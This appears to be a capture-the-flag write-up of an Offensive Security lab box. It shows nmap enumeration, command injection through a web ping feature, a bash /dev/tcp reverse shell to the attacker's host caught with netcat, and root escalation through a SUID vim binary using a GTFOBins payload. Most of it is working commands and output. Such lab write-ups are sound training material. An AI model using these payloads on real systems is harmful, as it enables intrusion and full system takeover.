---
layout: post
author: H4
---

This is an Offensive Security proving grounds box.

# enumeration
Using `nmap` to identify the attack surface of the target server.

## nmap
```bash
$ nmap -Pn -p22,80 -sV 192.168.150.86
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-01 15:49 EST
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 15:49 (0:00:06 remaining)
Nmap scan report for 192.168.150.86
Host is up (0.024s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.79 seconds
```

## web server (port 80)
The website exposes a web interface with a command ping feature. This looks juicy to test for a potential `command execution` vulnerability.

---

# vulnerability
## command injection
### request
```http
GET /?host=;whoami HTTP/1.1
Host: 192.168.150.86
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.150.86/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```
### response
```http
HTTP/1.1 200 OK
Date: Tue, 01 Feb 2022 20:50:43 GMT
Server: Apache/2.4.29 (Ubuntu)
Content-Length: 52
Connection: close
Content-Type: text/html; charset=UTF-8

<html>
<body>

<pre>www-data
</pre>
</body>
</html>
```

> It worked! He now have command execution on the server.
{: .prompt-info }

---

# post exploitation
## establish reverse shell with tty
### reverse shell
#### start listener on attacker machine
```bash
$ nc -lvp 80          
listening on [any] 80 ...
```

#### trigger reverse shell on target
payload: ```bash -c 'bash -i >& /dev/tcp/192.168.49.150/80l 0>&1'```
```http
GET /?host=;bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.150/80l+0>%261' HTTP/1.1
Host: 192.168.150.86
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://192.168.150.86/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

#### catch connect from target
```bash
$ nc -lvp 80       
listening on [any] 80 ...
192.168.150.86: inverse host lookup failed: Unknown host
connect to [192.168.49.150] from (UNKNOWN) [192.168.150.86] 56586
bash: cannot set terminal process group (1044): Inappropriate ioctl for device
bash: no job control in this shell
www-data@shakabrah:/var/www/html$ whoami
whoami
www-data
```

### make the `shell` more beautiful
```bash
www-data@shakabrah:/home/dylan$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@shakabrah:/home/dylan$ export TERM=xterm
export TERM=xterm
```

## get `root` access

Looking for files with the `SUID` flag and owned by 'root'.

```bash
www-data@shakabrah:/home/dylan$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 -exec ls -l {} \; 2> /dev/null -o -perm -g+s \) 
-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 34816 Feb 27  2019 /sbin/unix_chkpwd
-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo
-rwxr-sr-x 1 root tty 14328 Jan 17  2018 /usr/bin/bsd-write
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwxr-sr-x 1 root mlocate 43088 Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 71816 Mar 22  2019 /usr/bin/chage
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwxr-sr-x 1 root crontab 39352 Nov 16  2017 /usr/bin/crontab
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwxr-sr-x 1 root ssh 362640 Mar  4  2019 /usr/bin/ssh-agent
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 2675336 Mar 18  2020 /usr/bin/vim.basic
-rwxr-sr-x 1 root tty 30800 Mar  5  2020 /usr/bin/wall
-rwxr-sr-x 1 root shadow 22808 Mar 22  2019 /usr/bin/expiry
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 100760 Nov 22  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-xr-x 1 root root 113528 Jul 10  2020 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-- 1 root messagebus 42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 26696 Mar  5  2020 /bin/umount
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 43088 Mar  5  2020 /bin/mount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
```

The `vim.basic` binary looks interesting.  
Having a look at [gtfobins](https://gtfobins.github.io/gtfobins/vim/#suid) reveals that we can exploit it to get `root` access.

```bash
www-data@shakabrah:/home/dylan$ /usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
# whoami
root
```

---

# accessing the flags
## first flag
```bash
# cd home
# ls
dylan
# cd dylan
# ls
local.txt
# cat local.txt
6******************************3
```

## second flag
```bash
# cd /root
# ls
proof.txt
# cat proof.txt
c******************************3
```

Pwned! <@:-)
